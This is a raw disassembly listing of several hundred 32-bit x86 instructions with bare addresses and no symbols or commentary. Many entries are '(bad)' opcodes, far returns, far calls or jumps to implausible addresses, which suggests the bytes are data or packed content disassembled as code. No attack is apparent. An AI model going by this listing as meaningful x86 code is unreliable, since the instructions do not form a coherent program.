  4305e7:	mov    ecx,0xff858db0
  4305ec:	clc    
  4305ed:	enter  0x4d45,0x3c
  4305f1:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  4305f8:	test   esi,edi
  4305fa:	clc    
  4305fb:	inc    DWORD PTR [ebp+0x45]
  4305fe:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430606:	test   DWORD PTR [ecx],esi
  430608:	clc    
  430609:	pushf  
  43060a:	inc    ebp
  43060b:	(bad)  
  43060c:	cmp    ah,bh
  43060e:	pushf  
  43060f:	inc    ebp
  430610:	mov    edx,DWORD PTR [eax-0x24]
  430613:	add    BYTE PTR [ebp+0x0],dl
  430616:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43061c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  430620:	add    al,dl
  430622:	jmp    0x10407f2
  430627:	jb     0x430676
  430629:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  43062f:	xor    ecx,DWORD PTR [ebp+0x3b]
  430632:	xor    ecx,DWORD PTR [edi]
  430634:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  430638:	(bad)  
  43063a:	clc    
  43063b:	int3   
  43063c:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  430643:	push   cs
  430644:	xor    ecx,eax
  430646:	xor    esp,ecx
  430648:	add    ebp,DWORD PTR [eax]
  43064a:	add    esi,DWORD PTR [eax]
  43064c:	(bad)  
  43064e:	retf   0x55cc
  430651:	repnz mov eax,DWORD PTR [ebp-0x10]
  430655:	(bad)  
  430656:	cli    
  430657:	fdiv   st(1),st
  430659:	test   DWORD PTR [eax+edi*8],ecx
  43065c:	dec    ebp
  43065d:	inc    ebp
  43065e:	xor    edi,DWORD PTR [eax-0x7167afd]
  430664:	add    BYTE PTR [ebp+0x0],al
  430667:	mov    ecx,DWORD PTR [ebp-0x24]
  43066a:	mov    ecx,ebx
  43066c:	clc    
  43066d:	jne    0x43063a
  43066f:	mov    esi,0xd672d3
  430674:	into   
  430675:	into   
  430676:	scas   eax,DWORD PTR es:[edi]
  430677:	dec    ebp
  430678:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  43067e:	sub    ecx,esi
  430680:	cmp    ecx,DWORD PTR [ebp+0x77]
  430683:	(bad)  
  430684:	mov    edi,eax
  430686:	mov    al,0x85
  430688:	mov    eax,edi
  43068a:	add    BYTE PTR [ebp-0x75],al
  43068d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430694:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43069a:	(bad)  
  43069c:	retf   0x559c
  43069f:	(bad)  
  4306a0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4306a7:	inc    ebp
  4306a8:	add    eax,0xeb9c4d3f
  4306ad:	(bad)  
  4306ae:	mov    ecx,eax
  4306b0:	lods   al,BYTE PTR ds:[esi]
  4306b1:	test   DWORD PTR [ebp-0x8],edx
  4306b4:	xor    ecx,DWORD PTR [ebp+0x33]
  4306b7:	mov    eax,DWORD PTR [ebx]
  4306b9:	lock add ecx,ebx
  4306bc:	bswap  esi
  4306be:	retf   0x55d1
  4306c1:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  4306c7:	jmp    0x4306c2
  4306c9:	add    BYTE PTR ds:0xebc44d8b,al
  4306cf:	push   ebp
  4306d0:	mov    ebp,DWORD PTR [ebx]
  4306d2:	test   al,0x8b
  4306d4:	push   ebp
  4306d5:	clc    
  4306d6:	xor    ecx,ebx
  4306d8:	xor    ecx,esi
  4306da:	add    edx,ecx
  4306dc:	add    eax,DWORD PTR [edx+0xca010f]
  4306e2:	push   ebp
  4306e3:	dec    ebp
  4306e4:	mov    ecx,DWORD PTR [ebx-0x34050710]
  4306ea:	stc    
  4306eb:	rol    DWORD PTR ds:0xebce4dd6,cl
  4306f1:	scas   eax,DWORD PTR es:[edi]
  4306f2:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  4306f8:	xor    ebp,DWORD PTR [ebx]
  4306fa:	xor    edi,DWORD PTR [ebx]
  4306fc:	add    esi,DWORD PTR [edi+0x3]
  4306ff:	mov    ecx,DWORD PTR [edi]
  430701:	clc    
  430702:	retf   0x55cb
  430705:	into   
  430706:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43070d:	mov    eax,0x3376554d
  430712:	mov    esi,DWORD PTR [ebx]
  430714:	enter  0x5503,0x3
  430718:	xor    ecx,DWORD PTR [edi]
  43071a:	xor    ecx,edx
  43071c:	add    edx,DWORD PTR [ebp+0x3]
  43071f:	mov    ecx,DWORD PTR [edi]
  430721:	lock retf 0x4dfa
  430725:	stc    
  430726:	mov    ecx,DWORD PTR [eax]
  430728:	or     BYTE PTR [ebp+0x4d],cl
  43072b:	jmp    0x10707bb
  430730:	dec    ebp
  430731:	dec    ebp
  430732:	(bad)  
  430733:	mov    esp,esp
  430735:	clc    
  430736:	test   ebx,ecx
  430738:	clc    
  430739:	ror    DWORD PTR [ebp-0x2a],cl
  43073c:	mov    esi,ecx
  43073e:	in     al,dx
  43073f:	scas   eax,DWORD PTR es:[edi]
  430740:	inc    ebp
  430741:	mov    esi,DWORD PTR [ebx]
  430743:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  43074a:	retf   
  43074b:	ja     0x43071b
  43074d:	mov    ebp,DWORD PTR [eax-0x48]
  430750:	dec    ebp
  430751:	xor    ecx,DWORD PTR [di+0x3]
  430755:	mov    ebp,eax
  430757:	clc    
  430758:	push   ebp
  430759:	retf   
  43075a:	mov    dl,bl
  43075c:	adc    esi,edx
  43075e:	jb     0x43072e
  430760:	add    BYTE PTR [edi-0x3b7474b3],ch
  430766:	in     al,dx
  430767:	jge    0x430734
  430769:	sub    ecx,DWORD PTR [ebp+0x3b]
  43076c:	mov    esi,DWORD PTR [edi-0x24]
  43076f:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  430776:	mov    BYTE PTR [ebx-0x34b20729],cl
  43077c:	mov    edx,ebx
  43077e:	in     al,dx
  43077f:	(bad)  
  430780:	ror    esi,cl
  430782:	push   ebp
  430783:	scas   eax,DWORD PTR es:[edi]
  430784:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43078a:	fwait
  43078b:	sub    esi,DWORD PTR [edx]
  43078d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430793:	lods   al,BYTE PTR ds:[esi]
  430794:	xor    esp,DWORD PTR [ebx]
  430796:	add    ecx,DWORD PTR [ebp-0x18]
  430799:	mov    edi,DWORD PTR [ebp-0x8]
  43079c:	mov    bl,cl
  43079e:	cmp    dl,bl
  4307a0:	jb     0x430770
  4307a2:	add    dh,dl
  4307a4:	dec    ebp
  4307a5:	scas   eax,DWORD PTR es:[edi]
  4307a6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  4307ac:	shr    DWORD PTR [ebx],cl
  4307ae:	into   
  4307af:	cmp    edx,esi
  4307b1:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  4307b7:	dec    ebp
  4307b8:	dec    ebp
  4307b9:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  4307bf:	retf   
  4307c0:	xor    edx,esi
  4307c2:	add    ecx,esi
  4307c4:	imul   ecx,edx
  4307c7:	mov    DWORD PTR [ebp+0x8],edx
  4307ca:	xor    ecx,DWORD PTR [ebp+0x2b]
  4307cd:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  4307d3:	add    esi,DWORD PTR [ebx]
  4307d5:	mov    ah,0x3
  4307d7:	inc    ebp
  4307d8:	rdtsc  
  4307da:	xlat   BYTE PTR ds:[ebx]
  4307db:	pushf  
  4307dc:	jge    0x430767
  4307de:	xor    ebx,esp
  4307e0:	sub    eax,DWORD PTR [ebp-0x73]
  4307e3:	(bad)  
  4307e4:	cmp    al,al
  4307e6:	jb     0x43076d
  4307e8:	add    al,bh
  4307ea:	ror    DWORD PTR [ebp-0x7a],1
  4307ed:	xor    edi,edi
  4307ef:	add    edi,edi
  4307f1:	jmp    0x430840
  4307f3:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  4307f9:	dec    ebp
  4307fa:	into   
  4307fb:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430801:	fwait
  430802:	shl    DWORD PTR [edx],cl
  430804:	retf   0x5588
  430807:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43080d:	add    eax,DWORD PTR [eax]
  43080f:	call   0x8ace5d61
  430814:	fcom   DWORD PTR [ecx]
  430816:	retf   
  430817:	jb     0x43087e
  430819:	add    ch,cl
  43081b:	dec    ebp
  43081c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  430822:	dec    ebp
  430823:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  430829:	jge    0x4307f9
  43082b:	mov    BYTE PTR [edi+0xf723b3a],ch
  430831:	add    cl,dh
  430833:	dec    ebp
  430834:	dec    DWORD PTR [ebx-0x2c031b75]
  43083a:	adc    BYTE PTR [ebp+0x1],0x8b
  43083e:	add    ah,bl
  430840:	jge    0x4307ce
  430842:	push   0xffffff9b
  430844:	push   0x8b3032
  430849:	shl    BYTE PTR [ebp+0x55],0x6a
  43084d:	xor    edi,edi
  43084f:	xor    edx,DWORD PTR [ebx+eax*1]
  430852:	inc    ebp
  430853:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  430859:	dec    ebp
  43085a:	or     BYTE PTR [ecx+0x4dcce883],cl
  430860:	jbe    0x4307ed
  430862:	mov    esp,eax
  430864:	ror    bl,1
  430866:	enter  0x14ce,0xaf
  43086a:	dec    DWORD PTR [ebx-0x2cef13f8]
  430870:	push   ebp
  430871:	retf   0x5540
  430874:	push   ebp
  430875:	mov    esi,DWORD PTR [edx-0x18]
  430878:	mov    edx,ebx
  43087a:	cld    
  43087b:	(bad)  
  43087c:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430883:	sti    
  430884:	add    dh,cl
  430886:	push   0xffffff94
  430888:	call   FWORD PTR [ebx+0x3b5032d0]
  43088e:	mov    ecx,DWORD PTR [edi]
  430890:	enter  0x455e,0xff
  430894:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43089a:	xor    esi,DWORD PTR [ebx]
  43089c:	mov    DWORD PTR [ebx],0xcace0f9c
  4308a2:	aas    
  4308a3:	push   ebp
  4308a4:	inc    ebp
  4308a5:	xor    edx,esi
  4308a7:	add    edx,esi
  4308a9:	mov    eax,DWORD PTR [ebx]
  4308ab:	(bad)  
  4308ac:	jmp    0x43083a
  4308ae:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  4308b4:	rol    ah,1
  4308b6:	mov    esi,0xf133104d
  4308bb:	mov    edx,0xff388d80
  4308c0:	mov    dh,0xd1
  4308c2:	cmp    edx,DWORD PTR [ebp+0xf]
  4308c5:	mov    eax,DWORD PTR [edx-0x28]
  4308c8:	add    BYTE PTR [ebp-0x75],bh
  4308cb:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  4308d2:	fwait
  4308d3:	retf   0x8632
  4308d6:	cmp    ebp,0x8
  4308d9:	call   ebx
  4308db:	inc    ebp
  4308dc:	inc    ebp
  4308dd:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  4308e3:	mov    esi,DWORD PTR [ecx]
  4308e5:	int3   
  4308e6:	pushf  
  4308e7:	add    al,0xc7
  4308e9:	add    al,al
  4308eb:	add    bl,al
  4308ed:	(bad)  
  4308ee:	clc    
  4308ef:	int3   
  4308f0:	inc    ebp
  4308f1:	add    BYTE PTR [ecx],dh
  4308f3:	push   eax
  4308f4:	pushf  
  4308f5:	mov    edi,eax
  4308f7:	enter  0xc008,0x85
  4308fb:	aas    
  4308fc:	clc    
  4308fd:	gs inc ebp
  4308ff:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430905:	push   ss
  430906:	xor    ecx,DWORD PTR [ebp+0x3]
  430909:	sub    edx,DWORD PTR [ecx-0x76]
  43090c:	dec    ebp
  43090d:	add    DWORD PTR [ebx+0x88d845],ecx
  430913:	mov    esi,DWORD PTR [ebx]
  430915:	or     BYTE PTR [ebx],al
  430917:	cmp    edx,DWORD PTR [ecx-0x34]
  43091a:	dec    ebp
  43091b:	out    dx,eax
  43091c:	xor    eax,DWORD PTR [ebp+0x3]
  43091f:	mov    edx,DWORD PTR [ecx-0x28]
  430922:	dec    ebp
  430923:	add    BYTE PTR [ebx],dh
  430925:	push   0x518003
  43092a:	push   eax
  43092b:	add    BYTE PTR [ebx-0x300748b],cl
  430931:	sbb    BYTE PTR [ebp+0x45],cl
  430934:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  43093a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  430940:	dec    ebp
  430941:	inc    ebp
  430942:	xor    edx,esi
  430944:	add    edx,esi
  430946:	push   ecx
  430947:	(bad)  
  430948:	dec    ebp
  430949:	mov    al,ds:0xc5d83dff
  43094e:	retf   
  43094f:	(bad)  
  430950:	into   
  430951:	sub    bh,bh
  430953:	dec    esp
  430954:	adc    al,0x9c
  430956:	inc    ebp
  430957:	push   ebp
  430958:	test   DWORD PTR [edi],ecx
  43095a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  430961:	jmp    0xc9bc1875
  430966:	add    cl,dl
  430968:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  430972:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  430978:	rol    BYTE PTR [eax],0x54
  43097b:	clc    
  43097c:	gs jb  0x430986
  43097f:	mov    eax,DWORD PTR [ebp-0x30]
  430982:	xor    al,0x40
  430984:	sub    al,0xc7
  430986:	mov    al,ah
  430988:	add    DWORD PTR [ebp+0x4534f845],eax
  43098e:	sub    al,0x80
  430990:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430997:	mov    ch,0xff
  430999:	clc    
  43099a:	add    DWORD PTR [ebp+0x60],0x3d
  43099e:	call   FWORD PTR [eax+eax*1-0x277a77]
  4309a5:	inc    ebp
  4309a6:	dec    DWORD PTR [ebx-0x3427f701]
  4309ac:	test   esi,ecx
  4309ae:	dec    DWORD PTR [ebx-0x7f8a3701]
  4309b4:	push   eax
  4309b5:	add    DWORD PTR [ebp+0x0],eax
  4309b8:	dec    ebx
  4309ba:	or     al,0xce
  4309bc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  4309c3:	into   
  4309c4:	add    BYTE PTR [ebx-0x34ff2000],cl
  4309ca:	mov    esi,ecx
  4309cc:	sar    bh,0x45
  4309cf:	adc    al,0x8b
  4309d1:	clc    
  4309d2:	fadd   DWORD PTR [ebp+0x0]
  4309d5:	mov    ebp,DWORD PTR [edx+0x8]
  4309d8:	push   edi
  4309d9:	adc    BYTE PTR [eax+0x1],0x83
  4309dd:	add    al,al
  4309df:	retf   
  4309e0:	mov    ecx,esi
  4309e2:	cld    
  4309e3:	mov    eax,DWORD PTR [eax+0xcb01c8]
  4309e9:	into   
  4309ea:	add    BYTE PTR [ebx+0x756ae000],cl
  4309f0:	jne    0x430a25
  4309f2:	inc    DWORD PTR [ebx]
  4309f4:	rcl    BYTE PTR [ecx+0x50],1
  4309f7:	push   eax
  4309f8:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  4309fe:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430a05:	sar    bh,0x84
  430a08:	or     BYTE PTR [ebx],al
  430a0a:	push   eax
  430a0b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430a11:	pushf  
  430a12:	xor    edi,eax
  430a14:	pushf  
  430a15:	mov    ah,0x89
  430a17:	test   esp,ebp
  430a19:	clc    
  430a1a:	inc    ebp
  430a1b:	inc    ebp
  430a1c:	mov    DWORD PTR [eax+eax*8],esi
  430a1f:	sub    al,0x32
  430a21:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  430a28:	dec    ebp
  430a29:	xor    eax,DWORD PTR gs:[edi+0x3]
  430a2d:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  430a33:	xor    eax,DWORD PTR gs:[edi+0x3]
  430a37:	or     DWORD PTR [ecx+0x45ff085c],0x0
  430a3e:	shl    DWORD PTR [ebp-0x380064],1
  430a44:	enter  0x858d,0x60
  430a48:	clc    
  430a49:	inc    DWORD PTR [ebp+0x50]
  430a4c:	cmp    al,0x75
  430a4e:	pushf  
  430a4f:	(bad)  
  430a50:	(bad)  
  430a51:	pop    esp
  430a52:	lods   al,BYTE PTR ds:[esi]
  430a53:	inc    DWORD PTR [ebp+0x4508f8ff]
  430a59:	mov    edi,DWORD PTR [esi]
  430a5b:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  430a62:	test   DWORD PTR [edi-0x8],edx
  430a65:	sbb    al,0x45
  430a67:	add    BYTE PTR [eax],bh
  430a69:	push   0x8b809c
  430a6e:	loopne 0x430ab5
  430a70:	push   ebp
  430a71:	mov    esi,DWORD PTR [ebx]
  430a73:	cld    
  430a74:	add    eax,DWORD PTR [eax+0xf013b]
  430a7a:	adc    al,0x0
  430a7c:	add    bh,bh
  430a7e:	jmp    0xc00b9b
  430a83:	add    BYTE PTR [ebp+0x45],cl
  430a86:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  430a8c:	dec    ebp
  430a8d:	push   0x38033
  430a92:	cmp    eax,DWORD PTR [eax]
  430a94:	unpcklps xmm7,xmm0
  430a97:	jne    0x430a99
  430a99:	dec    DWORD PTR [ebx+0x5545c818]
  430a9f:	mov    DWORD PTR [ebx],esi
  430aa1:	shl    BYTE PTR [ebx],1
  430aa3:	inc    ebp
  430aa4:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  430aaa:	retf   0x5575
  430aad:	dec    DWORD PTR [ebx-0x5ba13e8]
  430ab3:	(bad)  
  430ab4:	stc    
  430ab5:	loopne 0x430ac3
  430ab7:	test   DWORD PTR [ebp-0x8],ecx
  430aba:	xor    eax,DWORD PTR [ebp+0x3]
  430abd:	mov    ebp,ecx
  430abf:	rol    BYTE PTR [eax],1
  430ac1:	inc    ebp
  430ac2:	add    BYTE PTR [eax-0x7747ab3],bh
  430ac8:	clc    
  430ac9:	inc    ebp
  430aca:	retf   
  430acb:	mov    edx,ebx
  430acd:	loopne 0x430aa5
  430acf:	retf   
  430ad0:	into   
  430ad1:	into   
  430ad2:	scas   eax,DWORD PTR es:[edi]
  430ad3:	dec    ebp
  430ad4:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  430ada:	sub    ecx,esi
  430adc:	cmp    ecx,DWORD PTR [ebp+0x77]
  430adf:	(bad)  
  430ae0:	mov    edi,eax
  430ae2:	enter  0x8985,0xf8
  430ae6:	add    BYTE PTR [ebp-0x75],al
  430ae9:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430af0:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430af6:	(bad)  
  430af8:	retf   0x559c
  430afb:	(bad)  
  430afc:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430b03:	inc    ebp
  430b04:	add    eax,0xeb9c4d3f
  430b09:	(bad)  
  430b0a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430b10:	xor    ecx,DWORD PTR [ebp+0x33]
  430b13:	mov    eax,DWORD PTR [ebx]
  430b15:	in     al,dx
  430b16:	add    ecx,ebx
  430b18:	bswap  esi
  430b1a:	retf   0x55d1
  430b1d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430b23:	jmp    0x430b1e
  430b25:	add    BYTE PTR ds:0xebf44d8b,al
  430b2b:	push   ebp
  430b2c:	mov    ebp,DWORD PTR [ebx]
  430b2e:	mov    eax,0x33f8558b
  430b33:	retf   
  430b34:	xor    ecx,esi
  430b36:	add    edx,ecx
  430b38:	add    eax,DWORD PTR [edx+0xca010f]
  430b3e:	push   ebp
  430b3f:	dec    ebp
  430b40:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430b46:	stc    
  430b47:	rol    DWORD PTR ds:0xebce4dd6,cl
  430b4d:	scas   eax,DWORD PTR es:[edi]
  430b4e:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430b54:	xor    ebp,DWORD PTR [ebx]
  430b56:	xor    edi,DWORD PTR [ebx]
  430b58:	add    esi,DWORD PTR [edi+0x3]
  430b5b:	mov    ecx,DWORD PTR [edi]
  430b5d:	clc    
  430b5e:	retf   0x55cb
  430b61:	into   
  430b62:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430b69:	test   al,0x4d
  430b6b:	push   ebp
  430b6c:	jbe    0x430ba1
  430b6e:	mov    esi,DWORD PTR [ebx]
  430b70:	mov    al,0x3
  430b72:	push   ebp
  430b73:	add    esi,DWORD PTR [ebx]
  430b75:	rdpmc  
  430b77:	retf   0x5503
  430b7a:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430b80:	dec    ebp
  430b81:	stc    
  430b82:	mov    ecx,DWORD PTR [eax]
  430b84:	or     BYTE PTR [ebp+0x4d],cl
  430b87:	jmp    0x1370c17
  430b8c:	dec    ebp
  430b8d:	dec    ebp
  430b8e:	(bad)  
  430b8f:	mov    esp,esp
  430b91:	clc    
  430b92:	test   ebx,ecx
  430b94:	clc    
  430b95:	ror    DWORD PTR [ebp-0x2a],cl
  430b98:	mov    esi,ecx
  430b9a:	lock scas eax,DWORD PTR es:[edi]
  430b9c:	inc    ebp
  430b9d:	mov    esi,DWORD PTR [ebx]
  430b9f:	hlt    
  430ba0:	pushf  
  430ba1:	jge    0x430b2e
  430ba3:	sub    esp,esp
  430ba5:	cmp    ecx,ebx
  430ba7:	ja     0x430b77
  430ba9:	mov    ebp,DWORD PTR [eax-0x58]
  430bac:	dec    ebp
  430bad:	xor    ecx,DWORD PTR [di+0x3]
  430bb1:	mov    ebp,eax
  430bb3:	clc    
  430bb4:	push   ebp
  430bb5:	retf   
  430bb6:	mov    dl,bl
  430bb8:	adc    esi,edx
  430bba:	jb     0x430b8a
  430bbc:	add    BYTE PTR [edi-0xb7474b3],ch
  430bc2:	lock jge 0x430b90
  430bc5:	sub    ecx,DWORD PTR [ebp+0x3b]
  430bc8:	mov    esi,DWORD PTR [edi-0x28]
  430bcb:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430bd2:	mov    BYTE PTR [ebx-0x34b20729],cl
  430bd8:	mov    edx,ebx
  430bda:	lock (bad) 
  430bdc:	ror    esi,cl
  430bde:	push   ebp
  430bdf:	scas   eax,DWORD PTR es:[edi]
  430be0:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430be6:	fwait
  430be7:	sub    esi,DWORD PTR [edx]
  430be9:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430bf0:	xor    esp,DWORD PTR [ebx]
  430bf2:	add    ecx,DWORD PTR [ebp-0x18]
  430bf5:	mov    edi,DWORD PTR [ebp-0x8]
  430bf8:	mov    bl,cl
  430bfa:	cmp    dl,bl
  430bfc:	jb     0x430bcc
  430bfe:	add    dh,dl
  430c00:	dec    ebp
  430c01:	scas   eax,DWORD PTR es:[edi]
  430c02:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430c08:	shr    DWORD PTR [ebx],cl
  430c0a:	into   
  430c0b:	cmp    edx,esi
  430c0d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430c13:	dec    ebp
  430c14:	dec    ebp
  430c15:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430c1b:	retf   
  430c1c:	xor    edx,esi
  430c1e:	add    ecx,esi
  430c20:	imul   ecx,edx
  430c23:	mov    DWORD PTR [ebp+0x8],edx
  430c26:	xor    ecx,DWORD PTR [ebp+0x2b]
  430c29:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430c2f:	add    esi,DWORD PTR [ebx]
  430c31:	rol    BYTE PTR [ebx],0x45
  430c34:	rdtsc  
  430c36:	xlat   BYTE PTR ds:[ebx]
  430c37:	pushf  
  430c38:	jge    0x430bc3
  430c3a:	xor    ebx,eax
  430c3c:	sub    eax,DWORD PTR [ebp-0x73]
  430c3f:	(bad)  
  430c40:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430c47:	dec    ebp
  430c48:	xchg   BYTE PTR [ebx],dh
  430c4a:	inc    DWORD PTR [ebx]
  430c4c:	(bad)  
  430c4d:	jmp    0x430c9c
  430c4f:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430c55:	dec    ebp
  430c56:	into   
  430c57:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430c5d:	fwait
  430c5e:	shl    DWORD PTR [edx],cl
  430c60:	retf   0x5588
  430c63:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430c69:	add    eax,DWORD PTR [eax]
  430c6b:	call   0x8ace61bd
  430c70:	fcom   QWORD PTR [ecx]
  430c72:	retf   
  430c73:	jb     0x430cda
  430c75:	add    ch,cl
  430c77:	dec    ebp
  430c78:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430c7e:	dec    ebp
  430c7f:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430c85:	jge    0x430c55
  430c87:	mov    BYTE PTR [edi+0xf723b3a],ch
  430c8d:	add    cl,dh
  430c8f:	dec    ebp
  430c90:	dec    DWORD PTR [ebx-0x2c031b01]
  430c96:	inc    ebp
  430c97:	push   ebp
  430c98:	dec    DWORD PTR [ebx-0x73ff2734]
  430c9e:	lea    ebx,[ebx-0x7400cdac]
  430ca4:	push   eax
  430ca5:	mov    ah,0x45
  430ca7:	push   ebp
  430ca8:	mov    esi,DWORD PTR [ebx]
  430caa:	les    esi,FWORD PTR [ebx]
  430cac:	add    BYTE PTR [ebx],al
  430cae:	inc    DWORD PTR [ebx]
  430cb0:	mov    ecx,DWORD PTR [edi]
  430cb2:	cld    
  430cb3:	retf   0x4d80
  430cb6:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430cbc:	jne    0x430c49
  430cbe:	jmp    eax
  430cc0:	ror    bl,1
  430cc2:	or     cl,dh
  430cc4:	add    BYTE PTR [edi-0xf2f7475],ch
  430cca:	not    bl
  430ccc:	adc    al,0xca
  430cce:	inc    ebp
  430ccf:	push   ebp
  430cd0:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430cd6:	push   0xaf80d6
  430cdb:	mov    eax,DWORD PTR [eax]
  430cdd:	in     al,0xff
  430cdf:	sti    
  430ce0:	sbb    dh,cl
  430ce2:	pop    esi
  430ce3:	xchg   esp,eax
  430ce4:	leave  
  430ce5:	fwait
  430ce6:	add    al,0x32
  430ce8:	push   ebp
  430ce9:	cmp    ebp,esp
  430ceb:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430cef:	dec    DWORD PTR [ecx-0x740f0375]
  430cf5:	push   ebp
  430cf6:	cld    
  430cf7:	xor    ebp,ebx
  430cf9:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430cff:	push   ebp
  430d00:	clc    
  430d01:	xor    esi,ecx
  430d03:	add    esi,DWORD PTR [ebp-0x75]
  430d06:	(bad)  
  430d07:	hlt    
  430d08:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430d0f:	mov    DWORD PTR [esi],eax
  430d11:	hlt    
  430d12:	(bad)  
  430d13:	dec    ebp
  430d14:	add    esi,DWORD PTR [ebx]
  430d16:	(bad)  
  430d17:	mov    edx,0xffc68d0a
  430d1c:	add    dl,cl
  430d1e:	leave  
  430d1f:	push   ebp
  430d20:	push   ebp
  430d21:	mov    ebp,esp
  430d23:	fcom   QWORD PTR [ecx+0x7d]
  430d26:	inc    ebp
  430d27:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430d2d:	iret   
  430d2e:	cld    
  430d2f:	retf   0x868f
  430d32:	loopne 0x430d31
  430d34:	mov    edi,edi
  430d36:	mov    esi,DWORD PTR [ebp-0x8]
  430d39:	mov    esi,eax
  430d3b:	cld    
  430d3c:	jne    0x430cee
  430d3e:	mov    BYTE PTR [ecx],0xa
  430d41:	add    dh,al
  430d43:	test   DWORD PTR [eax],ecx
  430d45:	inc    esi
  430d47:	inc    DWORD PTR [edi]
  430d49:	mov    eax,esi
  430d4b:	cld    
  430d4c:	add    DWORD PTR [eax+0x901c6],eax
  430d52:	leave  
  430d53:	xor    BYTE PTR [ebp+0x45],dl
  430d56:	in     al,dx
  430d57:	mov    edx,DWORD PTR [ecx-0x40]
  430d5a:	inc    ebp
  430d5b:	add    BYTE PTR [ecx-0x74000301],cl
  430d61:	int3   
  430d62:	cld    
  430d63:	jne    0x430d1d
  430d65:	call   0xcc2070
  430d6a:	mov    esi,DWORD PTR [ebp-0x8]
  430d6d:	test   eax,esi
  430d6f:	je     0x430de6
  430d71:	mov    eax,esi
  430d73:	cld    
  430d74:	add    al,0x80
  430d76:	add    WORD PTR [ecx+0x0],ax
  430d7a:	fiadd  DWORD PTR [eax]
  430d7c:	mov    BYTE PTR [eax],0x3d
  430d7f:	push   0xffffffc3
  430d81:	push   esi
  430d82:	mov    edx,DWORD PTR [eax+0x51]
  430d85:	pop    edi
  430d86:	lea    ebx,[ebx-0x8]
  430d89:	ret    0x45
  430d8c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d92:	xchg   eax,edi
  430d94:	mov    DWORD PTR [ebp-0x75],ecx
  430d97:	push   esi
  430d98:	clc    
  430d99:	jne    0x430d6b
  430d9b:	mov    ecx,0xf8450b0b
  430da0:	(bad)  
  430da1:	push   cs
  430da2:	or     BYTE PTR [ebp-0x3a],dh
  430da5:	cmp    eax,DWORD PTR [ecx]
  430da7:	pop    esi
  430da8:	(bad)  
